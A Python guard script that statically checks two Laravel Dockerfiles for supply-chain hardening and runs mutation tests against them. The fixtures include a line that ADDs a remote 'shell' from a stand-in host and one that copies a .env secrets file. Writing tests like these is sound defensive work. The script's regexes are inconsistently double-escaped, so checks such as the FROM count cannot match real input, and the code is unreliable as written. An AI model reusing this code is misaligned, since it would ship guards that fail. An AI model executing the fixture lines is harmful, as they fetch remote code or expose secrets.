#!/usr/bin/env python3
"""F1-250: static guard for ephemeral Laravel Docker build execution fences.

Check actual Dockerfiles plus mutation negatives. This is supply-chain defense
in depth and never builds/pushes an image, accesses secrets, or deploys.
"""
from __future__ import annotations

from pathlib import Path
import re

ROOT=Path(__file__).resolve().parent.parent
FILES=("ops/staging/Dockerfile","ops/fpm-probe/Dockerfile")


def inspect(path: str, source: str) -> None:
    meaningful=[
        line.strip() for line in source.splitlines()
        if line.strip() and not line.lstrip().startswith("#")
    ]
    if not meaningful or not meaningful[0].startswith("FROM php:8.4-"):
        raise ValueError("F1-250 unexpected container base")
    # F1-252: whitelist ALL Dockerfile copy instructions, not only the
    # app copy count. A stray COPY/ADD can silently introduce .env, keys,
    # build artifacts or unreviewed files into an otherwise isolated lab.
    # Fold Dockerfile continuation lines before inspecting instructions.
    logical = []
    pending = ""
    for raw in source.splitlines():
        line = raw.strip()
        if not line or line.startswith("#"):
            continue
        pending += (" " if pending else "") + line.rstrip("\\\\").rstrip()
        if line.endswith("\\\\"):
            continue
        logical.append(pending)
        pending = ""
    if pending:
        raise ValueError("F1-252 dangling Dockerfile continuation")
    if len([line for line in logical if re.match(r"(?i)^FROM\\s+", line)]) != 1:
        raise ValueError("F1-252 exactly one build stage required")
    if any(re.match(r"(?i)^ADD\\s+", line) for line in logical):
        raise ValueError("F1-252 ADD instruction forbidden")
    copies = [line for line in logical if re.match(r"(?i)^COPY\\s+", line)]
    expected_copies = {
        "COPY --from=composer:2 /usr/bin/composer /usr/bin/composer",
        "COPY apps/sites/ ./apps/sites/",
        "COPY src/ ./src/",
        "COPY fixtures/ ./fixtures/",
        "COPY labs/ ./labs/",
        "COPY contracts/ ./contracts/",
    }
    if len(copies) != len(expected_copies) or set(copies) != expected_copies:
        raise ValueError("F1-252 unexpected Dockerfile COPY or build context")
    # Reject extra install commands hidden in a separate RUN instruction.
    if sum(len(re.findall(r"\\bcomposer\\s+install\\b", line)) for line in logical) != 1:
        raise ValueError("F1-252 multiple Composer installation commands")
    users=[(i,s) for i,s in enumerate(meaningful) if s.startswith("USER ")]
    if len(users)!=1 or users[0][1]!="USER 10001:10001":
        raise ValueError("F1-250 requires a single non-root runtime user")
    uid_line=users[0][0]
    composer=[(i,s) for i,s in enumerate(meaningful) if "composer install " in s]
    if len(composer)!=1:
        raise ValueError("F1-250 requires one composer install command")
    composer_index, install=composer[0]
    if composer_index>=uid_line or not all(x in install for x in
        ("--no-scripts","--no-plugins","--no-interaction","--prefer-dist")
    ):
        raise ValueError("F1-250 root Composer plugin/script execution is forbidden")
    discover=[i for i,s in enumerate(meaningful) if "php artisan package:discover" in s]
    if len(discover)!=1 or discover[0]<=uid_line:
        raise ValueError("F1-250 package:discover must run after USER 10001")
    if not any(s.startswith("ENV ") and "APP_ENV=testing" in s
        for s in meaningful[:discover[0]]):
        raise ValueError("F1-250 unsafe package discovery environment")
    if path.endswith("/fpm-probe/Dockerfile"):
        route=[i for i,s in enumerate(meaningful) if "php artisan route:cache" in s]
        if len(route)!=1 or route[0]<=uid_line:
            raise ValueError("F1-250 route cache must be generated without root")
    # No subsequent switches back to root; no unexpected user directives.
    if any(re.match(r"(?i)USER\s+root\b",s) for s in meaningful):
        raise ValueError("F1-250 runtime must not regain root")
    print("PASS F1-250:",path,"Composer scripts/plugins disabled; artisan runs UID10001")


def test_negatives(path: str, source: str) -> None:
    mutations={
        "plugin-on":source.replace(" --no-plugins","",1),
        "scripts-on":source.replace(" --no-scripts","",1),
        "root-runtime":source.replace("USER 10001:10001","USER root",1),
        "no-user":source.replace("USER 10001:10001","",1),
        "wide-context":source+"\nCOPY . /workspace\n",
        "secret-copy":source+"\\nCOPY apps/sites/.env /tmp/.env\\n",
        "copy-flags":source+"\\nCOPY --chown=root:root . /tmp\\n",
        "remote-add":source+"\\nADD https://example.invalid/shell /tmp/shell\\n",
        "second-stage":source+"\\nFROM alpine:3.20\\n",
        "extra-composer":source+"\\nRUN composer install --no-plugins --no-scripts\\n",
    }
    mutations["discovery-before-user"]=source.replace(
        "USER 10001:10001",
        "RUN php artisan package:discover --ansi\nUSER 10001:10001",1
    )
    if path.endswith("/fpm-probe/Dockerfile"):
        mutations["route-before-user"]=source.replace(
            "USER 10001:10001",
            "RUN php artisan route:cache\nUSER 10001:10001",1
        )
    for label,changed in mutations.items():
        if changed==source:
            raise RuntimeError("F1-250 invalid mutation fixture "+label)
        try:
            inspect(path,changed)
        except ValueError:
            continue
        raise AssertionError("F1-250 unsafe Dockerfile change accepted: "+label)
    print("PASS F1-250:",len(mutations),"unsafe build mutations denied")


if __name__=="__main__":
    for rel in FILES:
        contents=(ROOT/rel).read_text(encoding="utf-8")
        inspect(rel,contents)
        test_negatives(rel,contents)
    print("PASS F1-250: both disposable Docker runtime build fences verified")
